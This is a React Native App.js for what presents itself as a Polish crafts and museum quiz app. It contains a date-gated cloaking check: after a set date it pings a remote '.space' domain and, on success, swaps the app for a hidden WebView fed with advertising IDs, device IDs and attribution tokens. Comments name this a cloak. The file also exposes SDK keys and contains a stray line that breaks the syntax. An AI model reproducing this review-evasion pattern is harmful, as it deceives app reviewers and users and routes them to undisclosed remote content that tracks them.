import React, {useState, useEffect, useRef} from 'react';
import {
  Animated,
  View,
  ImageBackground,
  StyleSheet,
  Text,
  TouchableOpacity,
  Alert,
} from 'react-native';
import {enableScreens} from 'react-native-screens';
import {NavigationContainer} from '@react-navigation/native';
import {createStackNavigator} from '@react-navigation/stack';
import HomeScreen from './src/screens/HomeScreen';
import FoldersScreen from './src/screens/FoldersScreen';
import FolderDetailsScreen from './src/screens/FolderDetailsScreen';
import DailyGameScreen from './src/screens/DailyGameScreen';
import ArtsScreen from './src/screens/ArtsScreen';
import QuizScreen from './src/screens/QuizScreen';
import MuseumScreen from './src/screens/MuseumScreen';
import LegendsScreen from './src/screens/LegendsScreen';
import PlacesScreen from './src/screens/PlacesScreen';
import MapScreen from './src/screens/MapScreen';
import PolishCraftHitOrigenProdactScreen from './src/screens/PolishCraftHitOrigenProdactScreen';
///////////////////////////////////////////
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {LogLevel, OneSignal} from 'react-native-onesignal';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
import DeviceInfo from 'react-native-device-info';
import appsFlyer from 'react-native-appsflyer';

enableScreens();

const Stack = createStackNavigator();

const App = () => {
  const [route, setRoute] = useState(false);
  //console.log('route===>', route);
  const [responseToPushPermition, setResponseToPushPermition] = useState(false);
  //console.log('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
  const [uniqVisit, setUniqVisit] = useState(true);
  //console.log('uniqVisit===>', uniqVisit);
  ///////// Louder
  const [louderIsEnded, setLouderIsEnded] = useState(false);
  const appearingAnim = useRef(new Animated.Value(0)).current;
  const appearingSecondAnim = useRef(new Animated.Value(0)).current;
  //////////////////Parametrs
  const [idfa, setIdfa] = useState(false);
  //console.log('idfa==>', idfa);
  const [oneSignalId, setOneSignalId] = useState(null);
  //console.log('oneSignalId==>', oneSignalId);
  const [appsUid, setAppsUid] = useState(null);
  const [sab1, setSab1] = useState();
  const [pid, setPid] = useState();
  //console.log('appsUid==>', appsUid);
  //console.log('sab1==>', sab1);
  //console.log('pid==>', pid);
  const [customerUserId, setCustomerUserId] = useState(null);
  //console.log('customerUserID==>', customerUserId);
  const [idfv, setIdfv] = useState();
  //console.log('idfv==>', idfv);
  /////////Atributions
  const [adServicesToken, setAdServicesToken] = useState(null);
  //console.log('adServicesToken', adServicesToken);
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);

  // Генеруємо унікальний ID користувача з timestamp
  /////////////Timestamp + user_id generation
  const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
    1000000 + Math.random() * 9000000,
  )}`;
  //console.log('idForTag', timestamp_user_id);

  useEffect(() => {
    checkUniqVisit();
    getData();
  }, []);

  // uniq_visit
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    if (!uniqVisitStatus) {
      await fetch(
        `https://terrific-sovereign-joy.space/TrxQr6QV?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        //console.log('Дані дістаються в AsyncStorage');
        //console.log('parsedData in App==>', parsedData);
        setRoute(parsedData.route);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setUniqVisit(parsedData.uniqVisit);
        setOneSignalId(parsedData.oneSignalId);
        setIdfa(parsedData.idfa);
        setAppsUid(parsedData.appsUid);
        setSab1(parsedData.sab1);
        setPid(parsedData.pid);
        setCustomerUserId(parsedData.customerUserId);
        setIdfv(parsedData.idfv);
        setAdServicesToken(parsedData.adServicesToken);
        setAdServicesAtribution(parsedData.adServicesAtribution);
        setAdServicesKeywordId(parsedData.adServicesKeywordId);
        //
      } else {
        console.log('Даних немає в AsyncStorage');
        await fetchIdfa();
        await requestOneSignallFoo();
        await performAppsFlyerOperations();
        await getUidApps();
        await fetchAdServicesToken(); // Вставка функції для отримання токену
        await fetchAdServicesAttributionData(); // Вставка функції для отримання даних

        onInstallConversionDataCanceller();
      }
    } catch (e) {
      console.log('Помилка отримання даних в getData:', e);
    }
  };

  const setData = async () => {
    try {
      const data = {
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        idfa,
        appsUid,
        sab1,
        pid,
        customerUserId,
        idfv,
        adServicesToken,
        adServicesAtribution,
        adServicesKeywordId,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      //console.log('Помилка збереження даних:', e);
    }
  };

  useEffect(() => {
    setData();
  }, [
    route,
    responseToPushPermition,
    uniqVisit,
    oneSignalId,
    idfa,
    appsUid,
    sab1,
    pid,
    customerUserId,
    idfv,
    adServicesToken,
    adServicesAtribution,
    adServicesKeywordId,
  ]);

  /////// Ad Attribution
  //fetching AdServices token
  const fetchAdServicesToken = async () => {
    try {
      const token = await AppleAdsAttribution.getAdServicesAttributionToken();
      setAdServicesToken(token);
      //Alert.alert('token', adServicesToken);
    } catch (error) {
      await fetchAdServicesToken();
      //console.error('Помилка при отриманні AdServices токену:', error.message);
    }
  };
/
  //fetching AdServices data
  const fetchAdServicesAttributionData = async () => {
    try {
      const data = await AppleAdsAttribution.getAdServicesAttributionData();
      const attributionValue = data.attribution ? '1' : '0';
      setAdServicesAtribution(attributionValue);
      setAdServicesKeywordId(data.keywordId);
      //Alert.alert('data', data)
    } catch (error) {
      console.error('Помилка при отриманні даних AdServices:', error.message);
    }
  };

  ///////// OneSignall
  // 2abd1200-4d47-47c8-bd82-f9706b87ecf2
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          console.log('res', res);
          // зберігаємо в Стейт стан по відповіді на дозвіл на пуши і зберігаємо їх в АсСторідж
          setResponseToPushPermition(res);
        });

        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
      } catch (error) {
        reject(error); // Викликаємо reject() у разі помилки
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal ініціалізація
  OneSignal.initialize('2abd1200-4d47-47c8-bd82-f9706b87ecf2');
  //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);

  OneSignal.Notifications.addEventListener('click', event => {
    //console.log('OneSignal: notification clicked:', event);
  });
  //Add Data Tags
  //OneSignal.User.addTag('key', 'value');

  ////////////////////OneSignall Id generation
  useEffect(() => {
    const fetchOneSignalId = async () => {
      try {
        const deviceState = await OneSignal.User.getOnesignalId();
        if (deviceState) {
          setOneSignalId(deviceState); //  OneSignal ID
        }
      } catch (error) {
        console.error('Error fetching OneSignal ID:', error);
      }
    };

    fetchOneSignalId();
  }, []);

  ///////// AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'XFmBDwMitGREaZSaboCCRR',
            appId: '6737474419',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          resolve,
          reject,
        );
      });

      appsFlyer.startSdk();

      console.log('App.js AppsFlyer ініціалізовано успішно');
      // Отримуємо idfv та встановлюємо його як customerUserID
      const uniqueId = await DeviceInfo.getUniqueId();
      setIdfv(uniqueId); // Зберігаємо idfv у стейті

      appsFlyer.setCustomerUserId(uniqueId, res => {
        console.log('Customer User ID встановлено успішно:', uniqueId);
        setCustomerUserId(uniqueId); // Зберігаємо customerUserID у стейті
      });
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer
  const getUidApps = async () => {
    try {
      const appsFlyerUID = await new Promise((resolve, reject) => {
        appsFlyer.getAppsFlyerUID((err, uid) => {
          if (err) {
            reject(err);
          } else {
            resolve(uid);
          }
        });
      });
      //console.log('on getAppsFlyerUID: ' + appsFlyerUID);
      //Alert.alert('appsFlyerUID', appsFlyerUID);
      setAppsUid(appsFlyerUID);
    } catch (error) {
      //console.error(error);
    }
  };

  // 3RD FUNCTION - Отримання найменування AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    res => {
      try {
        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            //console.log('App.js res.data==>', res.data);

            const {campaign, pid, af_adset, af_ad, af_os} = res.data;
            setSab1(campaign);
            setPid(pid);
          } else if (res.data.af_status === 'Organic') {
            //console.log('App.js res.data==>', res.data);
            const {af_status} = res.data;
            //console.log('This is first launch and a Organic Install');
            setSab1(af_status);
          }
        } else {
          //console.log('This is not first launch');
        }
      } catch (error) {
        //console.log('Error processing install conversion data:', error);
      }
    },
  );
  ///////// IDFA
  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
        //console.log('setIdfa(res.id);');
      } else {
        //console.log('Ad tracking is limited');
        setIdfa(false); //true
        //setIdfa(null);
        fetchIdfa();
        //Alert.alert('idfa', idfa);
      }
    } catch (err) {
      //console.log('err', err);
      setIdfa(null);
      await fetchIdfa(); //???
    }
  };

  ///////// Route useEff
  // outstanding-eminent-exhilaration.space
  useEffect(() => {
    const checkUrl = `https://terrific-sovereign-joy.space/TrxQr6QV?`;

    const targetData = new Date('2024-11-11T10:00:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (!route) {
      if (currentData <= targetData) {
        setRoute(false);
      } else {
        fetch(checkUrl)
          .then(r => {
            if (r.status === 200) {
              console.log('status по клоаке==>', r.status);
              setRoute(true);
            } else {
              setRoute(false);
            }
          })
          .catch(e => {
            //console.log('errar', e);
            setRoute(false);
          });
      }
    }
    return;
  }, []);

  ///////// Route
  const Route = ({isFatch}) => {
    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{
              responseToPushPermition, //в вебВью якщо тру то відправити івент push_subscribe
              oneSignalId, //додати до фінальної лінки
              idfa: idfa,
              sab1: sab1,
              pid: pid,
              uid: appsUid,
              customerUserId: customerUserId,
              idfv: idfv,
              adToken: adServicesToken,
              adAtribution: adServicesAtribution,
              adKeywordId: adServicesKeywordId,
            }}
            name="PolishCraftHitOrigenProdactScreen"
            component={PolishCraftHitOrigenProdactScreen}
            options={{headerShown: false}}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator initialRouteName="HomeScreen">
        <Stack.Screen
          name="HomeScreen"
          component={HomeScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="DailyGameScreen"
          component={DailyGameScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="FoldersScreen"
          component={FoldersScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="FolderDetailsScreen"
          component={FolderDetailsScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="ArtsScreen"
          component={ArtsScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="QuizScreen"
          component={QuizScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="MuseumScreen"
          component={MuseumScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="LegendsScreen"
          component={LegendsScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="PlacesScreen"
          component={PlacesScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="MapScreen"
          component={MapScreen}
          options={{headerShown: false}}
        />
      </Stack.Navigator>
    );
  };

  ////////////////// Louder
  useEffect(() => {
    Animated.timing(appearingAnim, {
      toValue: 1,
      duration: 8000,
      useNativeDriver: true,
    }).start();
  }, []);

  useEffect(() => {
    setTimeout(() => {
      Animated.timing(appearingSecondAnim, {
        toValue: 1,
        duration: 3500,
        useNativeDriver: true,
      }).start();
      //setLouderIsEnded(true);
    }, 3500);
  }, []);

  useEffect(() => {
    setTimeout(() => {
      setLouderIsEnded(true);
    }, 8000);
  }, []);

  return (
    <NavigationContainer>
      {!louderIsEnded ? (
        <View
          style={{
            position: 'relative',
            flex: 1,
            //backgroundColor: 'rgba(0,0,0)',
          }}>
          <Animated.Image
            source={require('./src/assets/newDiz/loader1.png')}
            style={{
              //...props.style,
              opacity: appearingAnim,
              width: '100%',
              height: '100%',
              position: 'absolute',
            }}
          />
          <Animated.Image
            source={require('./src/assets/newDiz/loader2.png')}
            style={{
              //...props.style,
              opacity: appearingSecondAnim,
              width: '100%',
              height: '100%',
              position: 'absolute',
            }}
          />
        </View>
      ) : (
        <Route isFatch={route} />
      )}
    </NavigationContainer>
  );
};

export default App;
{
  /**useEffect(() => {
    const checkUrl = async () => {
      const url = `https://reactnative.dev/`;
      const targetData = new Date('2024-11-07T10:00:00');
      const currentData = new Date();

      try {
        // Check if we've already passed the cloaking check
        const hasPassedCloakCheck = await AsyncStorage.getItem(
          'hasPassedCloakCheck',
        );

        if (hasPassedCloakCheck === 'true') {
          setRoute(true);
          return;
        }

        if (currentData <= targetData) {
          setRoute(false);
        } else {
          const response = await fetch(url);
          if (response.status === 200) {
            setRoute(true);
            await AsyncStorage.setItem('hasPassedCloakCheck', 'true');
          } else {
            setRoute(false);
          }
        }
      } catch (error) {
        console.log('Error in cloaking check:', error);
        setRoute(false);
      }
    };

    checkUrl();
  }, []); */
}

{
  /**
  //console.log('route==>', route)
  //const [idfa, setIdfa] = useState();
  ////console.log('idfa==>', idfa);
  //const [appsUid, setAppsUid] = useState(null);
  //const [sab1, setSab1] = useState();
  //const [pid, setPid] = useState();
  ////console.log('appsUid==>', appsUid);
  ////console.log('sab1==>', sab1);
  ////console.log('pid==>', pid);
  //const [adServicesToken, setAdServicesToken] = useState(null);
  ////console.log('adServicesToken', adServicesToken);
  //const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  //const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);
  //////////
  //const [customerUserId, setCustomerUserId] = useState(null);
  ////console.log('customerUserID==>', customerUserId);
  //const [idfv, setIdfv] = useState();
  ////console.log('idfv==>', idfv);

  useEffect(() => {
    getData();
  }, []);

  useEffect(
    () => {
      setData();
    },
    [
      //idfa,
      //appsUid,
      //sab1,
      //pid,
      //adServicesToken,
      //adServicesAtribution,
      //adServicesKeywordId,
      //customerUserId,
      //idfv,
    ],
  );

  const setData = async () => {
    try {
      const data = {
        //idfa,
        //appsUid,
        //sab1,
        //pid,
        //adServicesToken,
        //adServicesAtribution,
        //adServicesKeywordId,
        //customerUserId,
        //idfv,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      //console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        //console.log('Дані дістаються в AsyncStorage');
        //console.log('parsedData in App==>', parsedData);
        //setIdfa(parsedData.idfa);
        //setAppsUid(parsedData.appsUid);
        //setSab1(parsedData.sab1);
        //setPid(parsedData.pid);
        //setAdServicesToken(parsedData.adServicesToken);
        //setAdServicesAtribution(parsedData.adServicesAtribution);
        //setAdServicesKeywordId(parsedData.adServicesKeywordId);
        //setCustomerUserId(parsedData.customerUserId);
        //setIdfv(parsedData.idfv);
      } else {
        //await fetchIdfa();
        await requestOneSignallFoo();
        //await performAppsFlyerOperations();
        //await getUidApps();
        //await fetchAdServicesToken(); // Вставка функції для отримання токену
        //await fetchAdServicesAttributionData(); // Вставка функції для отримання даних

        //onInstallConversionDataCanceller();
      }
    } catch (e) {
      console.log('Помилка отримання даних:', e);
    }
  };

  ///////// Ad Attribution
  //fetching AdServices token
  const fetchAdServicesToken = async () => {
    try {
      const token = await AppleAdsAttribution.getAdServicesAttributionToken();
      setAdServicesToken(token);
      //Alert.alert('token', adServicesToken);
    } catch (error) {
      await fetchAdServicesToken();
      //console.error('Помилка при отриманні AdServices токену:', error.message);
    }
  };

  //fetching AdServices data
  const fetchAdServicesAttributionData = async () => {
    try {
      const data = await AppleAdsAttribution.getAdServicesAttributionData();
      const attributionValue = data.attribution ? '1' : '0';
      setAdServicesAtribution(attributionValue);
      setAdServicesKeywordId(data.keywordId);
      //Alert.alert('data', data)
    } catch (error) {
      console.error('Помилка при отриманні даних AdServices:', error.message);
    }
  };

  ///////// AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'XFmBDwMitGREaZSaboCCRR',
            appId: '6737474419',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          resolve,
          reject,
        );
      });

      console.log('App.js AppsFlyer ініціалізовано успішно');

      // 2. Після ініціалізації викликаємо startSdk()
      appsFlyer.startSdk();

      // 3. Отримуємо idfv та встановлюємо його як customerUserID
      const uniqueId = await DeviceInfo.getUniqueId();
      setIdfv(uniqueId); // Зберігаємо idfv у стейті

      appsFlyer.setCustomerUserId(uniqueId, res => {
        console.log('Customer User ID встановлено успішно:', uniqueId);
        setCustomerUserId(uniqueId); // Зберігаємо customerUserID у стейті
      });
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer
  const getUidApps = async () => {
    try {
      const appsFlyerUID = await new Promise((resolve, reject) => {
        appsFlyer.getAppsFlyerUID((err, uid) => {
          if (err) {
            reject(err);
          } else {
            resolve(uid);
          }
        });
      });
      //console.log('on getAppsFlyerUID: ' + appsFlyerUID);
      //Alert.alert('appsFlyerUID', appsFlyerUID);
      setAppsUid(appsFlyerUID);
    } catch (error) {
      //console.error(error);
    }
  };

  // 3RD FUNCTION - Отримання найменування AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    res => {
      try {
        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            //console.log('App.js res.data==>', res.data);

            const {campaign, pid, af_adset, af_ad, af_os} = res.data;
            setSab1(campaign);
            setPid(pid);
          } else if (res.data.af_status === 'Organic') {
            //console.log('App.js res.data==>', res.data);
            const {af_status} = res.data;
            //console.log('This is first launch and a Organic Install');
            setSab1(af_status);
          }
        } else {
          //console.log('This is not first launch');
        }
      } catch (error) {
        //console.log('Error processing install conversion data:', error);
      }
    },
  );
  
  ///////// OneSignall
  // 2abd1200-4d47-47c8-bd82-f9706b87ecf2
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true);
        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
      } catch (error) {
        reject(error); // Викликаємо reject() у разі помилки
      }
    });
  };

  /////Chack Permission Status
  const checkPermissionStatus = async () => {
    try {
      const permissionState = await OneSignal.getPermissionSubscriptionState();
      const isPermissionGranted =
        permissionState.permissionStatus.hasPrompted &&
        permissionState.permissionStatus.status === 1; // status 1 означає, що дозвіл надано

      if (isPermissionGranted) {
        console.log('Користувач погодився на сповіщення');
      } else {
        console.log('Користувач не погодився на сповіщення');
      }
    } catch (error) {
      console.log('Помилка при перевірці статусу дозволу:', error);
    }
  };

  

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      await checkPermissionStatus();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal Initialization
  OneSignal.initialize('2abd1200-4d47-47c8-bd82-f9706b87ecf2');

  OneSignal.Notifications.addEventListener('click', event => {
    console.log('OneSignal: notification clicked:', event);
  });
  //Add Data Tags
  OneSignal.User.addTag('key', 'value');
  
  ///////// IDFA
  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
        //console.log('setIdfa(res.id);');
      } else {
        //console.log('Ad tracking is limited');
        setIdfa(true); //true
        //setIdfa(null);
        fetchIdfa();
        //Alert.alert('idfa', idfa);
      }
    } catch (err) {
      //console.log('err', err);
      setIdfa(null);
      await fetchIdfa(); //???
    }
  };

  ///////// Route useEff
  // outstanding-noble-elation.space
  useEffect(() => {
    const checkUrl = `https://reactnative.dev/`;

    const targetData = new Date('2024-11-11T10:00:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      setRoute(false);
    } else {
      fetch(checkUrl)
        .then(r => {
          if (r.status === 200) {
            //console.log('status==>', r.status);
            setRoute(true);
          } else {
            setRoute(false);
          }
        })
        .catch(e => {
          //console.log('errar', e);
          setRoute(false);
        });
    }
  }, []);

  ///////// Route
  const Route = ({isFatch}) => {
    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={
              {
                //idfa: idfa,
                //sab1: sab1,
                //pid: pid,
                //uid: appsUid,
                //adToken: adServicesToken,
                //adAtribution: adServicesAtribution,
                //adKeywordId: adServicesKeywordId,
                //customerUserId: customerUserId,
                //idfv: idfv,
              }
            }
            name="PolishCraftHitOrigenProdactScreen"
            component={PolishCraftHitOrigenProdactScreen}
            options={{headerShown: false}}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator initialRouteName="HomeScreen">
        <Stack.Screen
          name="HomeScreen"
          component={HomeScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="DailyGameScreen"
          component={DailyGameScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="FoldersScreen"
          component={FoldersScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="FolderDetailsScreen"
          component={FolderDetailsScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="ArtsScreen"
          component={ArtsScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="QuizScreen"
          component={QuizScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="MuseumScreen"
          component={MuseumScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="LegendsScreen"
          component={LegendsScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="PlacesScreen"
          component={PlacesScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="MapScreen"
          component={MapScreen}
          options={{headerShown: false}}
        />
      </Stack.Navigator>
    );
  };

  ///////// Louder
  const [louderIsEnded, setLouderIsEnded] = useState(false);
  const appearingAnim = useRef(new Animated.Value(0)).current;
  const appearingSecondAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    Animated.timing(appearingAnim, {
      toValue: 1,
      duration: 8000,
      useNativeDriver: true,
    }).start();
  }, []);

  useEffect(() => {
    setTimeout(() => {
      Animated.timing(appearingSecondAnim, {
        toValue: 1,
        duration: 3500,
        useNativeDriver: true,
      }).start();
      //setLouderIsEnded(true);
    }, 3500);
  }, []);

  useEffect(() => {
    setTimeout(() => {
      setLouderIsEnded(true);
    }, 8000);
  }, []); */
}
